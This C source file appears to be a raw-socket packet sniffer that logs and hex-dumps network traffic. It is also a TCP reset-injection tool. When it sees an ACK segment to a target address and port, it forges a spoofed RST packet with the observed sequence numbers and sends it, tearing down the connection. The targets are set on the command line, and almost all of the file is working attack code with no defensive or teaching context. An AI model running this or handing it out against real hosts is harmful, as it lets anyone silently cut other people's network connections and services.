#include<netinet/in.h>
#include<errno.h>
#include<netdb.h>
#include<stdio.h>	//For standard things
#include<stdlib.h>	//malloc
#include<string.h>	//strlen

#include<netinet/ip_icmp.h>	//Provides declarations for icmp header
#include<netinet/udp.h>	//Provides declarations for udp header
#include<netinet/tcp.h>	//Provides declarations for tcp header
#include<netinet/ip.h>	//Provides declarations for ip header
#include<netinet/if_ether.h>	//For ETH_P_ALL
#include<net/ethernet.h>	//For ether_header
#include<sys/socket.h>
#include<arpa/inet.h>
#include<sys/ioctl.h>
#include<sys/time.h>
#include<sys/types.h>
#include<unistd.h>

#define DEST_PORT 32094		    /* target port */
#define DEST_ADDR "127.0.0.1"   /* the destination ip address */

#define SOURCE_PORT 2094		/* source port */
#define SOURCE_ADDR "127.0.0.2"   /* the source ip address */

#define DATAGRAM_SIZE 4096      /* datagram size in bytes */
#define PSEUDOGRAM_SIZE 40      /* pseudogram size in bytes */

/* IP CONSTANTS */
#define IP_HEADER_LENGTH 5      /* ip header length (in 32 bit octets) (this means multiply value by 4 for length in bytes) */
#define IP_VERSION 4            /* ip version (4 or 6) */
#define IP_TYPE_OF_SERVICE 0    /* Type of Service bit (used for QoS). 0x00 is normal */
#define IP_ID 100               /* the sequence number of the datagram (used for reassembly of fragmented datagrams, not important for single datagrams)
                                   so value doesn't matter here) */
#define IP_OFF 0                /* datagram fragment offset (used for reassembly of fragmented datagrams, should be zero here) */
#define IP_TIME_TO_LIVE 255     /* time to live is the amount of hops (routers to pass) before the packet
                                   is discarded, and an icmp error message is returned. (maximum is 255) */
#define IP_TRANSPORT_PROTOCOL 6 /* the transport layer protocol. can be tcp (6), udp (17), icmp (1), or whatever protocol follows the ip header. */

/* TCP CONSTANTS */
#define TCP_OFFSET 5            /* tcp header length. specifies the length of the TCP header in 32bit/4byte blocks */
#define TCP_WINDOW_SIZE 65535   /* TCP window size in bytes (maximum allowed is 65535) */
#define TCP_DEFAULT_ACK 0       /* ack of 0 for SYN connections */


/* 96 bit (12 bytes) pseudo header needed for tcp header checksum calculation */
struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

void ProcessPacket(unsigned char* , int);
void print_ip_header(unsigned char* , int);
void get_ip_header(unsigned char*, int, struct in_addr*, struct in_addr*);
void print_tcp_packet(unsigned char * , int );
void print_udp_packet(unsigned char * , int );
void print_icmp_packet(unsigned char* , int );
void PrintData (unsigned char* , int);

unsigned short  in_cksum(unsigned short*, int);
void spoofPacket(char*, uint16_t, char*, uint16_t, uint32_t, uint32_t);

FILE *logfile;
struct sockaddr_in source,dest;
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;	

/* vars that could be from command line */
char* destAddr;
uint16_t destPort;
char* sourceAddr;
uint16_t sourcePort;

int main(int argc, char* argv[])
{
	int saddr_size , data_size;
	struct sockaddr saddr;
		
	unsigned char *buffer = (unsigned char *) malloc(65536); //Its Big!

    /* Getting command line args */
    sourceAddr = SOURCE_ADDR;
    sourcePort = SOURCE_PORT;
    destAddr = DEST_ADDR;
    destPort = DEST_PORT;

    if(argc >= 5)
    {
        sourceAddr = argv[1];
        sourcePort = atoi(argv[2]);
        destAddr = argv[3];
        destPort = atoi(argv[4]);
    }

	
	logfile=fopen("log.txt","w");
	if(logfile==NULL) 
	{
		printf("Unable to create log.txt file.");
	}
	printf("Starting...\n");
	
	int sock_raw = socket( AF_PACKET , SOCK_RAW , htons(ETH_P_ALL)) ;
	//setsockopt(sock_raw , SOL_SOCKET , SO_BINDTODEVICE , "eth0" , strlen("eth0")+ 1 );
	
	if(sock_raw < 0)
	{
		//Print the error with proper message
		perror("Socket Error");
		return 1;
	}
	while(1)
	{
		saddr_size = sizeof saddr;
		//Receive a packet
		data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , (socklen_t*)&saddr_size);
		if(data_size <0 )
		{
			printf("Recvfrom error , failed to get packets\n");
			return 1;
		}
		//Now process the packet
		ProcessPacket(buffer , data_size);
	}
	close(sock_raw);
	printf("Finished");
	return 0;
}

void ProcessPacket(unsigned char* buffer, int size)
{
	//Get the IP Header part of this packet , excluding the ethernet header
	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
	++total;
	switch (iph->protocol) //Check the Protocol and do accordingly...
	{
		case 1:  //ICMP Protocol
			++icmp;
			print_icmp_packet( buffer , size);
			break;
		
		case 2:  //IGMP Protocol
			++igmp;
			break;
		
		case 6:  //TCP Protocol
			++tcp;
			print_tcp_packet(buffer , size);
			break;
		
		case 17: //UDP Protocol
			++udp;
			print_udp_packet(buffer , size);
			break;
		
		default: //Some Other Protocol like ARP etc.
			++others;
			break;
	}
	printf("TCP : %d   UDP : %d   ICMP : %d   IGMP : %d   Others : %d   Total : %d\r", tcp , udp , icmp , igmp , others , total);
}

void print_ethernet_header(unsigned char* Buffer, int Size)
{
	struct ethhdr *eth = (struct ethhdr *)Buffer;
	
	fprintf(logfile , "\n");
	fprintf(logfile , "Ethernet Header\n");
	fprintf(logfile , "   |-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_dest[0] , eth->h_dest[1] , eth->h_dest[2] , eth->h_dest[3] , eth->h_dest[4] , eth->h_dest[5] );
	fprintf(logfile , "   |-Source Address      : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_source[0] , eth->h_source[1] , eth->h_source[2] , eth->h_source[3] , eth->h_source[4] , eth->h_source[5] );
	fprintf(logfile , "   |-Protocol            : %u \n",(unsigned short)eth->h_proto);
}

void get_ip_header(unsigned char* Buffer, int Size, struct in_addr* ipSourceAddr, struct in_addr* ipDestAddr)
{
	print_ethernet_header(Buffer , Size);
  
	unsigned short iphdrlen;
		
	struct iphdr *iph = (struct iphdr *)(Buffer  + sizeof(struct ethhdr) );
	iphdrlen =iph->ihl*4;
	
	memset(&source, 0, sizeof(source));
	source.sin_addr.s_addr = iph->saddr;
	
	memset(&dest, 0, sizeof(dest));
	dest.sin_addr.s_addr = iph->daddr;
	
	fprintf(logfile , "\n");
	fprintf(logfile , "IP Header\n");
	fprintf(logfile , "   |-IP Version        : %d\n",(unsigned int)iph->version);
	fprintf(logfile , "   |-IP Header Length  : %d DWORDS or %d Bytes\n",(unsigned int)iph->ihl,((unsigned int)(iph->ihl))*4);
	fprintf(logfile , "   |-Type Of Service   : %d\n",(unsigned int)iph->tos);
	fprintf(logfile , "   |-IP Total Length   : %d  Bytes(Size of Packet)\n",ntohs(iph->tot_len));
	fprintf(logfile , "   |-Identification    : %d\n",ntohs(iph->id));
	//fprintf(logfile , "   |-Reserved ZERO Field   : %d\n",(unsigned int)iphdr->ip_reserved_zero);
	//fprintf(logfile , "   |-Dont Fragment Field   : %d\n",(unsigned int)iphdr->ip_dont_fragment);
	//fprintf(logfile , "   |-More Fragment Field   : %d\n",(unsigned int)iphdr->ip_more_fragment);
	fprintf(logfile , "   |-TTL      : %d\n",(unsigned int)iph->ttl);
	fprintf(logfile , "   |-Protocol : %d\n",(unsigned int)iph->protocol);
	fprintf(logfile , "   |-Checksum : %d\n",ntohs(iph->check));
	fprintf(logfile , "   |-Source IP        : %s\n",inet_ntoa(source.sin_addr));
	fprintf(logfile , "   |-Destination IP   : %s\n",inet_ntoa(dest.sin_addr));

    *ipSourceAddr = source.sin_addr;
    *ipDestAddr = dest.sin_addr;
}

void print_ip_header(unsigned char* Buffer, int Size)
{
	print_ethernet_header(Buffer , Size);
  
	unsigned short iphdrlen;
		
	struct iphdr *iph = (struct iphdr *)(Buffer  + sizeof(struct ethhdr) );
	iphdrlen =iph->ihl*4;
	
	memset(&source, 0, sizeof(source));
	source.sin_addr.s_addr = iph->saddr;
	
	memset(&dest, 0, sizeof(dest));
	dest.sin_addr.s_addr = iph->daddr;
	
	fprintf(logfile , "\n");
	fprintf(logfile , "IP Header\n");
	fprintf(logfile , "   |-IP Version        : %d\n",(unsigned int)iph->version);
	fprintf(logfile , "   |-IP Header Length  : %d DWORDS or %d Bytes\n",(unsigned int)iph->ihl,((unsigned int)(iph->ihl))*4);
	fprintf(logfile , "   |-Type Of Service   : %d\n",(unsigned int)iph->tos);
	fprintf(logfile , "   |-IP Total Length   : %d  Bytes(Size of Packet)\n",ntohs(iph->tot_len));
	fprintf(logfile , "   |-Identification    : %d\n",ntohs(iph->id));
	//fprintf(logfile , "   |-Reserved ZERO Field   : %d\n",(unsigned int)iphdr->ip_reserved_zero);
	//fprintf(logfile , "   |-Dont Fragment Field   : %d\n",(unsigned int)iphdr->ip_dont_fragment);
	//fprintf(logfile , "   |-More Fragment Field   : %d\n",(unsigned int)iphdr->ip_more_fragment);
	fprintf(logfile , "   |-TTL      : %d\n",(unsigned int)iph->ttl);
	fprintf(logfile , "   |-Protocol : %d\n",(unsigned int)iph->protocol);
	fprintf(logfile , "   |-Checksum : %d\n",ntohs(iph->check));
	fprintf(logfile , "   |-Source IP        : %s\n",inet_ntoa(source.sin_addr));
	fprintf(logfile , "   |-Destination IP   : %s\n",inet_ntoa(dest.sin_addr));
}

void print_tcp_packet(unsigned char* Buffer, int Size)
{
	unsigned short iphdrlen;
	
	struct iphdr *iph = (struct iphdr *)( Buffer  + sizeof(struct ethhdr) );
	iphdrlen = iph->ihl*4;
	
	struct tcphdr *tcph=(struct tcphdr*)(Buffer + iphdrlen + sizeof(struct ethhdr));
			
	int header_size =  sizeof(struct ethhdr) + iphdrlen + tcph->doff*4;

    struct in_addr ipDestAddr;
    struct in_addr ipSourceAddr;
	
    if(((unsigned int)tcph->ack) && ((uint16_t)(ntohs(tcph->dest)) == destPort))
    {
        get_ip_header(Buffer,Size, &ipSourceAddr, &ipDestAddr);

        if(ipDestAddr.s_addr == inet_addr(destAddr))
        {
            spoofPacket(inet_ntoa(ipDestAddr), (uint16_t)ntohs(tcph->dest), inet_ntoa(ipSourceAddr), (uint16_t)ntohs(tcph->source), (uint32_t)ntohl(tcph->ack_seq), (uint32_t)ntohl(tcph->seq));
        }
    }

	fprintf(logfile , "\n\n***********************TCP Packet*************************\n");	
		
	print_ip_header(Buffer,Size);
		
	fprintf(logfile , "\n");
	fprintf(logfile , "TCP Header\n");
	fprintf(logfile , "   |-Source Port      : %u\n",ntohs(tcph->source));
	fprintf(logfile , "   |-Destination Port : %u\n",ntohs(tcph->dest));
	fprintf(logfile , "   |-Sequence Number    : %u\n",ntohl(tcph->seq));
	fprintf(logfile , "   |-Acknowledge Number : %u\n",ntohl(tcph->ack_seq));
	fprintf(logfile , "   |-Header Length      : %d DWORDS or %d BYTES\n" ,(unsigned int)tcph->doff,(unsigned int)tcph->doff*4);
	//fprintf(logfile , "   |-CWR Flag : %d\n",(unsigned int)tcph->cwr);
	//fprintf(logfile , "   |-ECN Flag : %d\n",(unsigned int)tcph->ece);
	fprintf(logfile , "   |-Urgent Flag          : %d\n",(unsigned int)tcph->urg);
	fprintf(logfile , "   |-Acknowledgement Flag : %d\n",(unsigned int)tcph->ack);
	fprintf(logfile , "   |-Push Flag            : %d\n",(unsigned int)tcph->psh);
	fprintf(logfile , "   |-Reset Flag           : %d\n",(unsigned int)tcph->rst);
	fprintf(logfile , "   |-Synchronise Flag     : %d\n",(unsigned int)tcph->syn);
	fprintf(logfile , "   |-Finish Flag          : %d\n",(unsigned int)tcph->fin);
	fprintf(logfile , "   |-Window         : %d\n",ntohs(tcph->window));
	fprintf(logfile , "   |-Checksum       : %d\n",ntohs(tcph->check));
	fprintf(logfile , "   |-Urgent Pointer : %d\n",tcph->urg_ptr);
	fprintf(logfile , "\n");
	fprintf(logfile , "                        DATA Dump                         ");
	fprintf(logfile , "\n");
		
	fprintf(logfile , "IP Header\n");
	PrintData(Buffer,iphdrlen);
		
	fprintf(logfile , "TCP Header\n");
	PrintData(Buffer+iphdrlen,tcph->doff*4);
		
	fprintf(logfile , "Data Payload\n");	
	PrintData(Buffer + header_size , Size - header_size );
						
	fprintf(logfile , "\n###########################################################");
}

void print_udp_packet(unsigned char *Buffer , int Size)
{
	
	unsigned short iphdrlen;
	
	struct iphdr *iph = (struct iphdr *)(Buffer +  sizeof(struct ethhdr));
	iphdrlen = iph->ihl*4;
	
	struct udphdr *udph = (struct udphdr*)(Buffer + iphdrlen  + sizeof(struct ethhdr));
	
	int header_size =  sizeof(struct ethhdr) + iphdrlen + sizeof udph;
	
	fprintf(logfile , "\n\n***********************UDP Packet*************************\n");
	
	print_ip_header(Buffer,Size);			
	
	fprintf(logfile , "\nUDP Header\n");
	fprintf(logfile , "   |-Source Port      : %d\n" , ntohs(udph->source));
	fprintf(logfile , "   |-Destination Port : %d\n" , ntohs(udph->dest));
	fprintf(logfile , "   |-UDP Length       : %d\n" , ntohs(udph->len));
	fprintf(logfile , "   |-UDP Checksum     : %d\n" , ntohs(udph->check));
	
	fprintf(logfile , "\n");
	fprintf(logfile , "IP Header\n");
	PrintData(Buffer , iphdrlen);
		
	fprintf(logfile , "UDP Header\n");
	PrintData(Buffer+iphdrlen , sizeof udph);
		
	fprintf(logfile , "Data Payload\n");	
	
	//Move the pointer ahead and reduce the size of string
	PrintData(Buffer + header_size , Size - header_size);
	
	fprintf(logfile , "\n###########################################################");
}

void print_icmp_packet(unsigned char* Buffer , int Size)
{
	unsigned short iphdrlen;
	
	struct iphdr *iph = (struct iphdr *)(Buffer  + sizeof(struct ethhdr));
	iphdrlen = iph->ihl * 4;
	
	struct icmphdr *icmph = (struct icmphdr *)(Buffer + iphdrlen  + sizeof(struct ethhdr));
	
	int header_size =  sizeof(struct ethhdr) + iphdrlen + sizeof icmph;
	
	fprintf(logfile , "\n\n***********************ICMP Packet*************************\n");	
	
	print_ip_header(Buffer , Size);
			
	fprintf(logfile , "\n");
		
	fprintf(logfile , "ICMP Header\n");
	fprintf(logfile , "   |-Type : %d",(unsigned int)(icmph->type));
			
	if((unsigned int)(icmph->type) == 11)
	{
		fprintf(logfile , "  (TTL Expired)\n");
	}
	else if((unsigned int)(icmph->type) == ICMP_ECHOREPLY)
	{
		fprintf(logfile , "  (ICMP Echo Reply)\n");
	}
	
	fprintf(logfile , "   |-Code : %d\n",(unsigned int)(icmph->code));
	fprintf(logfile , "   |-Checksum : %d\n",ntohs(icmph->checksum));
	//fprintf(logfile , "   |-ID       : %d\n",ntohs(icmph->id));
	//fprintf(logfile , "   |-Sequence : %d\n",ntohs(icmph->sequence));
	fprintf(logfile , "\n");

	fprintf(logfile , "IP Header\n");
	PrintData(Buffer,iphdrlen);
		
	fprintf(logfile , "UDP Header\n");
	PrintData(Buffer + iphdrlen , sizeof icmph);
		
	fprintf(logfile , "Data Payload\n");	
	
	//Move the pointer ahead and reduce the size of string
	PrintData(Buffer + header_size , (Size - header_size) );
	
	fprintf(logfile , "\n###########################################################");
}

void PrintData (unsigned char* data , int Size)
{
	int i , j;
	for(i=0 ; i < Size ; i++)
	{
		if( i!=0 && i%16==0)   //if one line of hex printing is complete...
		{
			fprintf(logfile , "         ");
			for(j=i-16 ; j<i ; j++)
			{
				if(data[j]>=32 && data[j]<=128)
					fprintf(logfile , "%c",(unsigned char)data[j]); //if its a number or alphabet
				
				else fprintf(logfile , "."); //otherwise print a dot
			}
			fprintf(logfile , "\n");
		} 
		
		if(i%16==0) fprintf(logfile , "   ");
			fprintf(logfile , " %02X",(unsigned int)data[i]);
				
		if( i==Size-1)  //print the last spaces
		{
			for(j=0;j<15-i%16;j++) 
			{
			  fprintf(logfile , "   "); //extra spaces
			}
			
			fprintf(logfile , "         ");
			
			for(j=i-i%16 ; j<=i ; j++)
			{
				if(data[j]>=32 && data[j]<=128) 
				{
				  fprintf(logfile , "%c",(unsigned char)data[j]);
				}
				else 
				{
				  fprintf(logfile , ".");
				}
			}
			
			fprintf(logfile ,  "\n" );
		}
	}
}

/* IP checksum alg from internet */
unsigned short  in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum;    /* assumes long == 32 bits */
    u_short oddbyte;
    register u_short answer;  /* assumes u_short == 16 bits */

    /*
    * Our algorithm is simple, using a 32-bit accumulator (sum),
    * we add sequential 16-bit words to it, and at the end, fold back
    * all the carry bits from the top 16 bits into the lower 16 bits.
    */

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    /* mop up an odd byte, if necessary */
    if (nbytes == 1)
    {
        oddbyte = 0;    /* make sure top half is zero */
        *((u_char *) & oddbyte) = *(u_char *) ptr;  /* one byte only */
        sum += oddbyte;
    }

    /*
    * Add back carry outs from top 16 bits to low 16 bits.
    */

    sum = (sum >> 16) + (sum & 0xffff);  /* add high-16 to low-16 */
    sum += (sum >> 16);    /* add carry */
    answer = ~sum;    /* ones-complement, then truncate to 16 bits */
    return (answer);
}

void spoofPacket(char* sourceAddr, uint16_t sourcePort, char* destAddr, uint16_t destPort, uint32_t seqNumber, uint32_t ackNumber)
{
    int rawSocket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);             /* Open the raw socket */
    uint8_t datagram[DATAGRAM_SIZE];                                    /* this buffer will contain ip header, tcp header, and payload. 
                                                                           We'll point an ip header structure at its beginning, 
                                                                           and a tcp header structure after that to write the header values into it */
    struct ip *ipHeader = (struct ip *) datagram;                       /* Pointer to ip header section of datagram */
    struct tcphdr *tcpHeader = (struct tcphdr *) (datagram + sizeof (struct ip));  /* Pointer to tcp header section of datagram */
    struct sockaddr_in sockIn;                                          /* the sockaddr_in containing the destination address that is used
			                                                               in sendto() to determine the datagrams path */
    struct pseudo_header pseudoHeader;                                  /* pseudoheader for TCP checksum calculation */
    uint8_t pseudogram[PSEUDOGRAM_SIZE];                                /* full sized pseudo datagram for TCP checksum calculation */

    
    /* setting socket info structure stuff */
    sockIn.sin_port = htons(destPort);                                 /* you byte-order >1byte header values to network
			                                                               byte order (not needed on big endian machines) */
    sockIn.sin_addr.s_addr = inet_addr(destAddr);                      /* the destination address that will be spoofed in the packet */
    

    memset(datagram, 0, DATAGRAM_SIZE);	/* clear the datagram buffer */

    if(rawSocket == -1)
    {
        /* socket creation failed */
		perror("Failed to create raw socket\n");
		exit(1);
    }

    /* filling in the IP header values */
    ipHeader->ip_hl = IP_HEADER_LENGTH;     /* ip header length (in 32 bit octets) (this means multiply value by 4 for length in bytes) */
    ipHeader->ip_v = IP_VERSION;      /* ip version (4 or 6) */
    ipHeader->ip_tos = IP_TYPE_OF_SERVICE;    /* Type of Service bit (used for QoS). 0x00 is normal */
    ipHeader->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);	/* total length in bytes of the ip datagram (in this case no payload) */
    ipHeader->ip_id = htonl(IP_ID);	/* the sequence number of the datagram (the value doesn't matter here) */
    ipHeader->ip_off = IP_OFF;   /* datagram fragment offset (should be zero here) */
    ipHeader->ip_ttl = IP_TIME_TO_LIVE;      /* time to live, the number of hops before packet is discarded (max is 255) */
    ipHeader->ip_p = IP_TRANSPORT_PROTOCOL;      /* transport layer protocol (6 = tcp) */
    ipHeader->ip_sum = 0;		/* the datagram checksum for the whole IP datagram (set it to 0 before computing the actual checksum later) */
    ipHeader->ip_src.s_addr = inet_addr(sourceAddr);  /* the source IP address converted to a long (SYN's can be blindly spoofed) */
    ipHeader->ip_dst.s_addr = sockIn.sin_addr.s_addr;   /* the destination IP address converted to a long (SYN's can be blindly spoofed) */

    /* filling in the TCP header values */
    tcpHeader->th_sport = htons(sourcePort);	/* the source port (arbitrary port in this case) */
    tcpHeader->th_dport = htons(destPort);     /* the destination port */
    tcpHeader->th_seq = htonl(seqNumber);   /* TCP sequence number (in a SYN packet, the first number is random) */
    tcpHeader->th_ack = htonl(ackNumber);  /* ack for prev seq number (ack sequence is 0 in the 1st packet) */
    tcpHeader->th_x2 = 0;   /* unused, contains binary zeroes */
    tcpHeader->th_off = TCP_OFFSET;		/* segment offset, specifies the length of the TCP header in 32bit/4byte blocks. (first and only tcp segment so size zero) */
    tcpHeader->th_flags = TH_RST;	/* reset message */
    tcpHeader->th_win = htons(TCP_WINDOW_SIZE);	/* TCP window size in bytes (maximum allowed is 65535) */
    tcpHeader->th_sum = 0;  /* checksum, initially set to zero because we calculate it later */
    tcpHeader->th_urp = 0;  /* urgent pointer (not needed) */

    /* calculating the ip header checksum */
    ipHeader->ip_sum = in_cksum((unsigned short *) datagram, ipHeader->ip_len >> 1);

    /* calculating the TCP header checksum */
    pseudoHeader.source_address = inet_addr(sourceAddr);
    pseudoHeader.dest_address = sockIn.sin_addr.s_addr;
    pseudoHeader.placeholder = 0;
    pseudoHeader.protocol = IP_TRANSPORT_PROTOCOL;
    pseudoHeader.tcp_length = htons(sizeof(struct tcphdr));

	
    memcpy(pseudogram , (char*) &pseudoHeader , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcpHeader , sizeof(struct tcphdr));

    tcpHeader->check = in_cksum( (unsigned short*) pseudogram , PSEUDOGRAM_SIZE);


    /* IP_HDRINCL to tell the kernel that headers are included in the packet */
    int one = 1;
    const int *val = &one;
    if(setsockopt(rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf("Warning: Cannot set HDRINCL!\n");
    }

  
    //Send the packet
    if (sendto (rawSocket, datagram, ipHeader->ip_len,	0, (struct sockaddr *) &sockIn, sizeof (sockIn)) < 0)
    {
        perror("sendto failed");
    }
    //Data sent successfully
    else
    {
        printf ("Packet sent. Length : %d \n" , ipHeader->ip_len);
    }

    return;
}